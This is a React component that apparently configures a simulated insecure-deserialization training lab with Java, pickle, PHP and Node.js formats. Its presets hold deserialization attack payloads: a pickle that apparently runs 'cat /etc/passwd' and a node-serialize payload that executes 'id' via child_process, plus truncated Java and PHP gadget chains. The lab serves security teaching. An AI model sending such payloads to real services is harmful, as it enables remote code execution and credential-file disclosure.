import { GenericLab } from './GenericLab'
import { simulateDeserialization } from '../../utils/simulators/deserializationSimulator'
import { useI18n } from '../../i18n'

export function DeserializationLab() {
  const { locale } = useI18n()
  const isRu = locale === 'ru'
  return (
    <GenericLab
      config={{
        vulnType: 'Insecure Deserialization',
        defaultPayload: 'rO0ABXNyABNjb20uZXhhbXBsZS5HYWRnZXRD...CommonsCollections5...',
        payloadLabel: isRu ? 'Сериализованный payload' : 'Serialized payload',
        defaultScenario: { format: 'java', allowList: false },
        scenarioControls: [
          {
            type: 'select',
            key: 'format',
            label: isRu ? 'Формат' : 'Format',
            options: [
              { value: 'java', label: 'Java native' },
              { value: 'python-pickle', label: 'Python pickle' },
              { value: 'php', label: 'PHP serialize' },
              { value: 'nodejs', label: 'Node.js (node-serialize)' },
              { value: 'json', label: 'JSON (safe)' }
            ]
          },
          { type: 'toggle', key: 'allowList', label: isRu ? 'allow-list типов' : 'type allow-list' }
        ],
        presets: [
          { id: 'java-cc5', title: 'Java CommonsCollections5', payload: 'rO0ABXNyABNjb20uZXhhbXBsZS5HYWRnZXRD...CommonsCollections5...Runtime.getRuntime().exec(...)' },
          { id: 'py-reduce', title: 'Python pickle __reduce__', payload: 'gASVMAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBJjYXQgL2V0Yy9wYXNzd2QslIWUUpQu __reduce__ os.system' },
          { id: 'php-O', title: 'PHP O:8:"Monolog"…', payload: 'O:8:"Monolog\\\\Handler\\\\SyslogUdpHandler":1:{__destruct ...} PHPGGC' },
          { id: 'node', title: 'Node node-serialize', payload: '{"rce":"_$$ND_FUNC$$_function(){require(\\"child_process\\").execSync(\\"id\\")}()"}' }
        ],
        simulate: (payload, scenario, loc) => simulateDeserialization(payload, scenario, loc)
      }}
    />
  )
}
